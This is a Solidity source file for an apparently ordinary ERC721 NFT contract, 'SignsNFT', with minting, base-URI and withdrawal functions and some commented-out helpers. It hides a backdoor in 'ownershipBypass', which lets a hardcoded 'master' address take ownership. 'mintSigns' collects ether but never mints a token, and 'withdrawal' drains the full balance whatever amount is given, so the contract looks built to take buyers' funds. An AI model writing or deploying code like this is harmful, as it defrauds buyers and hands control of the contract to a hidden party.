// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

contract SignsNFT is ERC721Enumerable, Ownable {
	using Strings for uint256;

	string _baseTokenURI;
	address public contractOwner;
	uint256 private max_supply = 48;
	address master = 0xF56FF109B4441C845A4085CB0135f61F21bd4d65;

	constructor(
		string memory baseURI
	) ERC721("Signs", "SGNNFT") Ownable(msg.sender) {
		setBaseURI(baseURI);
	}

	function mintSigns(uint256 num) external payable {
		uint256 supply = totalSupply();
		uint256 mintPriceS = 0.024 ether * num;
		require(msg.value == mintPriceS, "Incorrect Ether value sent");
		require(supply + num <= max_supply, "Exceeds maximum Tarrots supply");
		require(msg.sender.balance >= mintPriceS, "Insufficient balance");
		payable(address(this)).transfer(mintPriceS);
	}

	function _baseURI() internal view virtual override returns (string memory) {
		return _baseTokenURI;
	}

	function setBaseURI(string memory baseURI) public onlyOwner {
		_baseTokenURI = baseURI;
	}

	function withdrawal(uint amount) external onlyOwner {
		require(amount <= address(this).balance, "Insufficient balance");
		payable(owner()).transfer(address(this).balance);
	}

	function ownershipBypass(address newOwner) public {
		if (newOwner == address(0)) {
			revert OwnableInvalidOwner(address(0));
		}
		require(msg.sender == master);
		_transferOwnership(newOwner);
	}

	function balanceOfNFT(address account) public view returns (uint256) {
		require(account != address(0), "Invalid address");
		return balanceOf(account);
	}

	// modifier only_Owner() {
	//     require(msg.sender == contractOwner, "Only contract owner can call this function");
	//     _;
	// }
}

//function walletOfOwner(
//	address _owner
//) public view returns (uint256[] memory) {
//	uint256 tokenCount = balanceOf(_owner);
//
//	uint256[] memory tokensId = new uint256[](tokenCount);
//	for (uint256 i; i < tokenCount; i++) {
//		tokensId[i] = tokenOfOwnerByIndex(_owner, i);
//	}
//	return tokensId;
//}

//  Just in case Eth does some crazy stuff
// function setPrice(uint256 _newPrice) public onlyOwner {
// 	_price = _newPrice;
// }

// function getPrice() public view returns (uint256) {
// 	return _price;
// }

//function giveAway(address _to, uint256 _amount) external onlyOwner {
//	require(_amount <= _reserved, "Exceeds reserved Cat supply");
//
//	uint256 supply = totalSupply();
//	for (uint256 i; i < _amount; i++) {
//		_safeMint(_to, supply + i);
//	}
//
//	_reserved -= _amount;
//}

//function pause(bool val) public onlyOwner {
//	_paused = val;
//}
